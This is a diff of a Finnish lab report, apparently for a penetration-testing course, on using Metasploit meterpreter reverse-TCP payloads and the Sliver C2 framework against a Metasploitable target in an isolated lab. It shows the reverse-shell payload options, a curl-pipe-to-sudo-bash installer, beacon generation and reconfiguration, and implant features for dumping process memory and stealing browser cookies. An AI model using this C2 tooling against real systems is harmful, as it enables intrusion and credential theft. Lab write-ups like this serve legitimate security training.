@@ -11,6 +11,10 @@ Seurasin artikkelia https://www.beyondtrust.com/blog/entry/how-to-use-metasploit
 
 Kohteena käytän metasploitablea (192.168.56.101) ja hyökkäyskoneena kali (192.168.56.1).
 
+Ennen seuraavia toimia poistin Kalin internetistä network managerin napista "Disconnect". Testaus:
+
+<img width="300" height="54" alt="image" src="https://github.com/user-attachments/assets/e5e1f8f4-1081-46c2-b638-12f5ee6ac0ae" />
+
 Payloadin luomiseksi käytin seuraavio valintoja:
 * `-p linux/x86/meterpreter/reverse_tcp`: Payloadiksi valitaan x86 arkkitehtuurin linuxiin tarkoitettu meterpeter reverse tcp -shell, eli meterpreter ohtaa kohteen koneelta yhteyden hyökkääjään.
 * `LHOST=192.168.56.1 LPORT=4444`: Hyökkääjän IP ja portti, johon meterpreter soittaa.
@@ -131,7 +135,9 @@ Tunnistukselta välttämiseksi aloittaisin luomalla msfvenomilla uuden payloadin
 
 Sliver on Command and Control (C2) viitekehys, joka koostuu sliver-serveristä ja sliver-clientista. Sliver-server on palvelin, johon clientit ja kohteet yhdistävät. Sliver-client on operaattorin, eli hyökkääjän komentorivityökalu, jolla ohjataan palvelinta ja kohteita. Implantit ovat sliverin payloadeja, jotka yhdistävät sliver-serveriin. (https://sliver.sh/tutorials/?name=1+-+Getting+Started)
 
-Asensin sliverin käyttäen sliverin GitHubissa ollutta asennus-skriptiä, `curl https://sliver.sh/install|sudo bash`.
+Yhdistin taas kalin verkkoon ja asensin sliverin käyttäen sliverin GitHubissa ollutta asennus-skriptiä, `curl https://sliver.sh/install|sudo bash`.
+
+Poistin kalin taas verkosta network managerin kautta.
 
 Käynnistin sliverin ja käytin palvelimena ensimmäistä vaihtoehtoa.
 
@@ -313,4 +319,94 @@ Ensiksi palvelin lähettää kohteelle 204 tavun pituisen paketin, johon kohde v
 
 ## e) Sliverillä voit muuttaa yhteyden ominaisuuksia. Kokeile ja näytä esimerkki. Muista todeta testein, että muutokset toimivat.
 
+Session yhteyksiin käytetään yhtä TCP-yhteyttä koko session ajan, kun taas beacon yhteyksissä kohde ottaa yhteyden palvelimeen tietyin välein. Beaconeilla on mahdollista muokata tätä aikaväli jälkikäteen. (https://sliver.sh/tutorials/?name=2+-+Beacons+vs+Sessions). Sessioiden osalta en dokumentaatiosta löytänyt kuinka aktiivisen implantin yhteyden ominaisuuksia on mahdollista muokata, jos näitä ominaisuuksia ei ole luontivaiheessa implanttiin sisäänrakennettu. Implantin luontivaiheessa yhteyttä on mahdollista muokata aina protokollista, niiden käyttäytymiseen, endpointeihin ja sertifikaatteihin (https://sliver.sh/docs/?name=C2+Advanced+Options).
 
+Beaconin yhteyden muokkaamisen testaamiseksi generoin beacon implantin.
+
+```
+[127.0.0.1] sliver (ARMED_PHYSICAL) > background
+[*] Background ...
+
+[127.0.0.1] sliver > generate beacon --http localhost --os linux --seconds 60 --jitter 5
+[*] Generating new linux/amd64 beacon implant binary (1m0s)
+[*] Symbol obfuscation is enabled
+[*] Build completed in 3m47s
+[*] Implant saved to /home/lassi/Downloads/COURAGEOUS_FENDER
+```
+* `--seconds 60`: Beacon ottaa yhteyden palvelimeen joka 60 sekunti.
+* `--jitter 5`: Beacon ottaa yhteyden palvelimeen +-5 sekunnin sisällä määritetystä ajasta.
+
+Ajoin binäärin kalissa, `./COURAGEOUS_FENDER`.
+
+Sliverissä beacon tuli näkyviin ja yhdistin siihen.
+
+```
+[*] Beacon d090567b COURAGEOUS_FENDER - 127.0.0.1:52212 (lika) - linux/amd64 - Sun, 03 May 2026 21:41:49 EEST
+
+[127.0.0.1] sliver > beacons
+ ID         Name                Transport   Hostname   Username   Operating System   Last Check-In   Next Check-In 
+========== =================== =========== ========== ========== ================== =============== ===============
+ d090567b   COURAGEOUS_FENDER   http(s)     lika       lassi      linux/amd64        20s             44s
+
+[127.0.0.1] sliver > use
+[*] Active beacon COURAGEOUS_FENDER (d090567b-26df-4ad2-bbf1-0a300f66e72e)
+```
+
+`reconfig`-komento mahdollistaa mm. yhteyden välin, jitterin ja palvelimen osoitteen muuttamisen jälkikäteen.
+
+<img width="614" height="242" alt="image" src="https://github.com/user-attachments/assets/1bdccec7-e1ac-44f3-82c6-7514f51a3935" />
+
+Muokkasin check-in aikaa, sekä jitteriä `reconfig`-komennolla.
+
+```
+[127.0.0.1] sliver (COURAGEOUS_FENDER) > reconfig -i 1000s -j 60s
+[*] Tasked beacon COURAGEOUS_FENDER (ed190ebf)
+[+] COURAGEOUS_FENDER completed task ed190ebf
+[*] Reconfigured beacon
+```
+
+Muutosten jälkeen sliver ilmoitti check-in väliksi noin 1000 sekuntia eli noin 17 minuutia vanhan 60 sekuntin sijaan.
+
+<img width="1023" height="94" alt="image" src="https://github.com/user-attachments/assets/db222331-bbfd-4338-a7a6-1ff53c879f14" />
+
+Muutoksesta huomioitavaa on, että komennot ajetaan kohteessa vain check-in:n yhteydessä. Tässä tapauksessa komentojen ajaminen voi kestää pisimmillään noin 17 minuuttia.
+
+## f) Sliverillä voi tehdä monenlaista kohteessa, ruutukaappauksista alkaen. Näytä esimerkkejä toiminnoista.
+
+Sliverin demonstroimiseksi tehokkaasti tapoin beaconin ja otin yhteyden sessioon.
+
+<img width="695" height="220" alt="image" src="https://github.com/user-attachments/assets/d6bee5fd-7348-4446-9057-142aa07c1454" />
+
+Sliverissä löytyy paljon mielenkiintoisia toimintoja, joista suurin osa löytyy myös meterpreteristä.
+
+<img width="789" height="1240" alt="image" src="https://github.com/user-attachments/assets/2b2e9cc2-626f-46fa-868f-4173a2aee531" />
+
+Yksi mielenkiintoinen ominaisuus on `procdump`, jonka avulla käynnissä olevan prosessin muisti voidaan dumpata. Dumpit voivat sisältää dataa kuten salasanoja tai avaimia.
+
+```
+[127.0.0.1] sliver (ARMED_PHYSICAL) > ps
+...
+173918   3866     sliver                             
+177437   79282    ARMED_PHYSICAL
+
+[127.0.0.1] sliver (ARMED_PHYSICAL) > procdump --name ARMED_PHYSICAL
+[*] Process dump stored in: /tmp/procdump_lika_177437_3846532757
+```
+
+Toinen mielenkiintoinen komento on `hex-edit`, joka mahdollistaa nimensä mukaisesti teidostojen heksakoodin muokkaamisen.
+
+```
+[127.0.0.1] sliver (ARMED_PHYSICAL) > ls
+/home/lassi/simpukat (3 items, 32.7 MiB)
+========================================
+drwxrwxr-x  lassi:lassi  .               <dir>     Sun May 03 18:43:20 +0300 2026
+-rwx------  lassi:lassi  ARMED_PHYSICAL  32.7 MiB  Sun May 03 18:10:43 +0300 2026
+-rwxrw-r--  lassi:lassi  meterpreter     207 B     Sat May 02 18:06:51 +0300 2026
+
+
+[127.0.0.1] sliver (ARMED_PHYSICAL) > hex-edit meterpreter
+```
+
+<img width="705" height="319" alt="image" src="https://github.com/user-attachments/assets/68a23149-82ce-4952-9b71-2ee67fbb7f1a" />
+
+Muita mielenkiintoisia komentoja ovat `msf` ja `msf-inject` mahdollistavat metasploit hyötykuormien ajon kohteessa. `cursed` mahdollistaa selainten ja selainpohjaisten sovellusten debuggaamisen, jonka avulla voidaan kaapata esimerkiksi keksejä.
